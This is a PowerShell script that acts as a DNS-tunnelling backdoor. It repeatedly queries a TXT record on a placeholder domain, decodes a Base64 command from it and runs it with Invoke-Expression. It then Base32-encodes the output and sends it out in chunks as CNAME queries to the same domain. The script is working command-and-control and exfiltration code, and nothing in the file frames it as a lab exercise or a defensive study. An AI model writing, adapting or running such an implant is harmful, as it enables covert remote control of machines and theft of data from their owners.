$domain = "You_DomainName.co.il"

function Send-CnameQuery {
    param (
        [string]$data
    )
    try {
        nslookup -type=CNAME "$data.$domain" | Out-Null
        Write-Output "Sent CNAME query: $data"
    } catch {
        Write-Output "Failed to send CNAME query: $_"
    }
}

function Encode-Base32 {
    param (
        [string]$data
    )
    $base32Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
    $output = ""
    $buffer = 0
    $bufferBits = 0

    foreach ($byte in $bytes) {
        $buffer = ($buffer -shl 8) -bor $byte
        $bufferBits += 8
        while ($bufferBits -ge 5) {
            $index = ($buffer -shr ($bufferBits - 5)) -band 31
            $output += $base32Alphabet[$index]
            $bufferBits -= 5
        }
    }
    if ($bufferBits -gt 0) {
        $index = ($buffer -shl (5 - $bufferBits)) -band 31
        $output += $base32Alphabet[$index]
    }
    return $output
}

while ($true) {
    try {
        Write-Output "Querying TXT record..."
        $txtOutput = nslookup -type=TXT $domain | Out-String
        if ($txtOutput -match 'text\s*=\s*"(.*?)"') {
            $encodedCommand = $matches[1]
            $decodedCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedCommand))
            Write-Output "Received Base64 command: $encodedCommand"
            Write-Output "Decoded command: $decodedCommand"

            Write-Output "Executing command..."
            $commandOutput = Invoke-Expression $decodedCommand 2>&1
            Write-Output "Command output: $commandOutput"

            $uniqueId = (Get-Date).ToString("yyyyMMddHHmmss")
            $encodedOutput = Encode-Base32 "$uniqueId|$commandOutput"

            
            $chunks = $encodedOutput -split "(.{1,40})" | Where-Object { $_ -ne "" }
            $chunkCount = $chunks.Count

            Send-CnameQuery "$uniqueId-start"
            Start-Sleep -Milliseconds 500
            Send-CnameQuery "$uniqueId-$chunkCount-chunks"
            Start-Sleep -Milliseconds 500

            $chunkIndex = 1
            foreach ($chunk in $chunks) {
                Send-CnameQuery "$uniqueId-chunk$chunkIndex-$chunk"
                Start-Sleep -Milliseconds 3000
                $chunkIndex++
            }

            Send-CnameQuery "$uniqueId-end"
        } else {
            Write-Output "No TXT record found for command."
        }
    } catch {
        Write-Output "An error occurred: $_"
    }
    Start-Sleep -Seconds 25
}
